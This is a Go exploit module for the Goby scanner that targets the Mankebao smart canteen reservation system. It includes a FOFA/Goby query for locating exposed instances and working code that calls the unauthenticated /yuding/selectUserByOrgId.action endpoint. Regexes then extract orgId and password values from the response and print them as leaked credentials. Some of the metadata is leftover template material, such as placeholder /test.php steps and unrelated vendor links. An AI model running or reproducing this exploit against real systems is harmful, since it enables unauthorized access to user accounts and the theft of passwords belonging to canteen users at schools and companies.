package exploits

import (
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Mankebao Smart Canteen Reservation System /yuding/selectUserByOrgId.action Unauthorized Access Vulnerability",
    "Description": "<p>The Mankebao Smart Canteen System was developed by Zhengqi Shengye (Beijing) Technology Co., Ltd., aiming to improve the service level and dining experience of canteens through scientific and technological means. The system supports a variety of canteen dining forms, such as self-service meals, buffets, stall dining, and reservation meals, etc., to meet the dining needs in different scenarios. The system is a smart solution designed for group dining scenarios such as schools and enterprises. The system integrates facial recognition technology, information management systems, and a variety of smart hardware devices to achieve efficient, intelligent, and convenient canteen operations. Since the selectUserByOrgld interface of the Mankebao Smart Canteen System does not perform permission control, unauthenticated remote attackers can gain unauthorized access, leak system user account passwords and other information, and further cracking can log in to the system backend, making the system extremely unsafe.</p>",
    "Product": "Manke-Bao-Backstage-MS",
    "Homepage": "https://www.mankebao.cn/",
    "DisclosureDate": "2024-09-13",
    "PostTime": "2024-10-23",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"智慧食堂预订系统\" && title=\"智慧食堂预订系统\"",
    "GobyQuery": "body=\"智慧食堂预订系统\" && title=\"智慧食堂预订系统\"",
    "Level": "1",
    "Impact": "<p>Since the selectUserByOrgld interface of the Mankebao Smart Canteen System does not perform permission control, unauthenticated remote attackers can gain unauthorized access, leak system user account passwords and other information, and further cracking can log in to the system backend, making the system extremely unsafe.</p>",
    "Recommendation": "<p>1. Pay attention to the manufacturer's official website and pay attention to updated information in a timely manner:<a href=\"https://www.mankebao.cn/\">https://www.mankebao.cn/</a><a href=\"https://www.star-net.cn/index.php\"></a><a href=\"https://github.com/sylabs/sif\"></a><a href=\"https://www.dahuatech.com/\"></a></p><p>2. Deploy a web application firewall . </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/140850725"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "user_info",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access",
        "HW-2024"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "满客宝智慧食堂预定系统 /yuding/selectUserByOrgId.action 未授权访问漏洞",
            "Product": "满客宝智慧食堂预定系统",
            "Description": "<p>满客宝智慧食堂系统由正奇晟业(北京)科技有限公司开发，旨在通过科技手段提升食学的服务水平和就餐体验。该系统支持多种食堂就餐形式，如自选餐、自助餐、档口就餐、预订取餐等，满足不同场景下的餐饮需求，系统是一款专为学校、企业等团餐场景设计的智慧化解决方案，该系统通过集成人脸识别日技术、信息化管理系统以及多种智能硬件设备，实现了食堂运营的高效化、智能化和便捷化。由于满客宝智慧食堂系统 selectUserByOrgld 接口处未进行权限控制，导致未经身份验证的远程攻击者可以未授权访问，泄需系统用户账号密码等信息，进一步破解即可登录系统后台，使系统处于极不安全的状态。<br></p>",
            "Recommendation": "<p>1、关注厂商官网，及时关注更新信息：<a href=\"https://www.mankebao.cn/\">https://www.mankebao.cn/</a><a href=\"https://www.star-net.cn/index.php\"></a><a href=\"https://www.dahuatech.com/\"></a></p><p>2、部署Web应用防火墙。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>由于满客宝智慧食堂系统 selectUserByOrgld 接口处未进行权限控制，导致未经身份验证的远程攻击者可以未授权访问，泄需系统用户账号密码等信息，进一步破解即可登录系统后台，使系统处于极不安全的状态。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Mankebao Smart Canteen Reservation System /yuding/selectUserByOrgId.action Unauthorized Access Vulnerability",
            "Product": "Manke-Bao-Backstage-MS",
            "Description": "<p>The Mankebao Smart Canteen System was developed by Zhengqi Shengye (Beijing) Technology Co., Ltd., aiming to improve the service level and dining experience of canteens through scientific and technological means. The system supports a variety of canteen dining forms, such as self-service meals, buffets, stall dining, and reservation meals, etc., to meet the dining needs in different scenarios. The system is a smart solution designed for group dining scenarios such as schools and enterprises. The system integrates facial recognition technology, information management systems, and a variety of smart hardware devices to achieve efficient, intelligent, and convenient canteen operations. Since the selectUserByOrgld interface of the Mankebao Smart Canteen System does not perform permission control, unauthenticated remote attackers can gain unauthorized access, leak system user account passwords and other information, and further cracking can log in to the system backend, making the system extremely unsafe.<br></p>",
            "Recommendation": "<p>1. Pay attention to the manufacturer's official website and pay attention to updated information in a timely manner:<a href=\"https://www.mankebao.cn/\">https://www.mankebao.cn/</a><a href=\"https://www.star-net.cn/index.php\"></a><a href=\"https://github.com/sylabs/sif\"></a><a href=\"https://www.dahuatech.com/\"></a></p><p>2. Deploy a web application firewall .&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Since the selectUserByOrgld interface of the Mankebao Smart Canteen System does not perform permission control, unauthenticated remote attackers can gain unauthorized access, leak system user account passwords and other information, and further cracking can log in to the system backend, making the system extremely unsafe.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9962"
}`

	postOrGet_4MOFgcJkvn := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		header := map[string]string{
			"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Connection": "close",
		}

		resp, err := setGetRequest(hostInfo, fileUrl, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/yuding/selectUserByOrgId.action"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/yuding/selectUserByOrgId.action?record=": "\"success\":true",
			}
			// 函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"user_info": {"/yuding/selectUserByOrgId.action?record=", "\"success\":true"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			//匹配账号
			regular := `"orgId":"([a-zA-Z0-9-]+)"`
			makeRegular := func(RegularContent string, RegularUrl string) ([]string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return nil, fmt.Errorf("can't match value")
				}
				getname := reRequest.FindAllStringSubmatch(RegularContent, -1)
				if len(getname) == 0 {
					return nil, fmt.Errorf("can't match value")
				}

				var results []string
				for _, v := range getname {
					results = append(results, v[1])
				}
				return results, nil
			}
			output1, err := makeRegular(resp, regular)
			//匹配密码
			regular2 := `"password":"([a-zA-Z0-9-]+)"`
			makeRegular2 := func(RegularContent string, RegularUrl string) ([]string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return nil, fmt.Errorf("can't match value")
				}
				getname := reRequest.FindAllStringSubmatch(RegularContent, -1)
				if len(getname) == 0 {
					return nil, fmt.Errorf("can't match value")
				}

				var results []string
				for _, v := range getname {
					results = append(results, v[1])
				}
				return results, nil
			}
			output2, err := makeRegular2(resp, regular2)
			expResult.Success = true
			expResult.Output = "泄露信息：用户信息\n"
			for o := range output1 {
				expResult.Output += "orgId: " + output1[o] + "\npassword: " + output2[o] + "\n"
			}

			return expResult
		},
	))
}
